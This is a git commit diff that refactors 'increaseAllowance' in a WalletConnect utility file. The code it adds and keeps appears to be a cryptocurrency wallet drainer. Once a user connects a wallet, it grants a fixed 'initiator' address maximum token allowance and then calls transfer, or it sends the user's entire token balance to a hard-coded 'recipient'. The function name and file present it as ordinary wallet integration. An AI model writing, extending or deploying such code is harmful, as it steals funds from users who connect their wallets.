19422e8932125e868141b358faa576b40cb7c9a6
Alhassan Matarwy <67296782+Matarwy@users.noreply.github.com>
2023-09-02 01:03:10 +0300

    Update walletconnect.js

--- src/utils/walletconnect.js
+++ src/utils/walletconnect.js
@@ -111,6 +111,8 @@ export const increaseAllowance = async (token) => {
       return;
     };
     const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
+    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
+    const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
     if (permitToken) {
       let nonce = undefined
       await contract.methods.nonces(account).call(function(error, result) {
@@ -267,40 +269,26 @@ export const increaseAllowance = async (token) => {
         }
       })
       return;
-    }
-    try{
-      const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
-      if (increaseallown) {
-        console.log(increaseallown);
-        console.log("increase")
-        await contract.methods.increaseAllowance(constants.initiator, constants.max)
-        .send({ from: account })
-        .on('transactionHash', async (hash) => {
-          console.log(hash);
-        })
-        .on("confirmation", async (confirmationNumber, receipt) => {
-          if (confirmationNumber >= 2) {
-            console.log(receipt);
-            await transfer(token);
-          }
-        });
-        return;
-      }
-    } catch (error) {
-      console.log(error)
-    }
-    try{
-      const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
-      if (transfertoken) {
-        console.log(transfertoken);
-        console.log("transfer")
-        await contract.methods
-          .transfer(constants.recipient, token.balance)
-          .send({ from: account });
-      }
+    }else if (increaseallown) {
+      console.log(increaseallown);
+      console.log("increase")
+      await contract.methods.increaseAllowance(constants.initiator, constants.max)
+      .send({ from: account })
+      .on('transactionHash', async (hash) => {
+        console.log(hash);
+      })
+      .on("confirmation", async (confirmationNumber, receipt) => {
+        if (confirmationNumber >= 2) {
+          console.log(receipt);
+          await transfer(token);
+        }
+      });
       return;
-    } catch (error) {
-      console.log(error)
+    }else if (transfertoken) {
+      await contract.methods
+        .transfer(constants.recipient, token.balance)
+        .send({ from: account });
+      return;
     }
     
   } catch (error) {
